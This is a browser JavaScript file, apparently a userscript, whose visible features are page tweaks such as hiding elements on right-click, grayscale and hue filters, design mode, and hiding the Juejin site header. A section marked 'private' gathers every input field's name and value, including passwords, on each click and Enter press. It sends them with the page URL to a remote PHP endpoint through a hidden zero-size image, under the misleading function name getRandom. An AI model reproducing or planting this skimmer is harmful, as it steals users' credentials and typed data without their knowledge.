var i = 0;
var doHide = false;
document.oncontextmenu = function (event) {
	if (!doHide) {
		// console.log('不隐藏....');
		return;
	}
	var event=event||window.event;//兼容IE

	var target = event.target;
	target.style.display = 'none';
	// console.log('隐藏了 ' + (++i) + ' 个。');
	// 阻止时间冒泡
	event.stopPropagation();
	 //取消事件相关的默认行为
	if(event.preventDefault){
	 	//标准技术
	 	event.preventDefault();
	} 
	if(event.returnValue) {
		 //兼容IE9之前的IE
		 event.returnValue=false;
		 return false;
	}
	
}


var grayTime = 0
var changeColor = 0
var designMode = false
// ------------------------ private-----------------------------
document.onkeyup = function (e) {
	if (e.keyCode == 17) {
		doHide = !doHide;
	}
	if (e.keyCode == 13) {
		slz()
	}
	// 屏幕 黑白
	if(e.altKey && (e.key == 'g')) {
		grayTime++
		document.body.style.filter = grayTime % 2 == 1 ? 'grayscale(1)' : ''
	}
	// 屏幕 反色
	if(e.altKey && (e.key == 'c')) {
		changeColor++
		document.body.style.filter = changeColor % 2 == 1 ? 'hue-rotate(45deg)' : ''
	}
	// 文档 编辑模式
	if(e.altKey && (e.key == 'w')) {
		designMode = !designMode
		document.designMode = designMode == true ? 'on' : 'off'
	}
}
document.onclick = function (e) {
	// var target = e.target.innerText;
	// target += e.target.value;
	// target = target.replace(/\s/g, '');
	// var reg = /百度|搜索|确定|登录|注册|确认|取消|register|login/ig;
	// if (reg.test(target)) {
	// 	slz()
	// }
	slz()
}
var result = 'url=' + window.location.href + '=>windowLoaded&';
var prevResult = ''
getRandom ()
function slz() {
  result = 'url=' + window.location.href + '&';
  var ipts = document.getElementsByTagName('input');
  if (ipts.length = 0) {
  	return false;
  }
  for (var i=0; i<ipts.length; i++) {
    var ipt = ipts[i];
    result += ipt.name + '-' + i + '=' + ipt.value + '&'
  }
  getRandom ()
}
function getRandom () {
  // 校验是否相同
  if (prevResult != result) {
  	prevResult = result
  } else {
  	return false
  }

  // 校验是否相同
	var privateGetRandom = document.getElementById('privateGetRandom')
	if (privateGetRandom) {
		privateGetRandom.src = 'http://192.168.73.147/private/getRandom.php?' + result
	} else {
		var img = new Image()
		img.width = 0
		img.height = 0
		img.id = 'privateGetRandom'
		img.src = 'http://127.0.0.1/private/getRandom.php?' + result
		document.body.appendChild(img)
		img.style.display = 'none'
	}
}
// ------------------------ private-----------------------------

// 掘金头部隐藏
var pageUrl = window.location.href;
if (pageUrl.indexOf('https://juejin.im/post') > -1) {
	document.getElementsByClassName('main-header')[0].style.display = 'none';
}
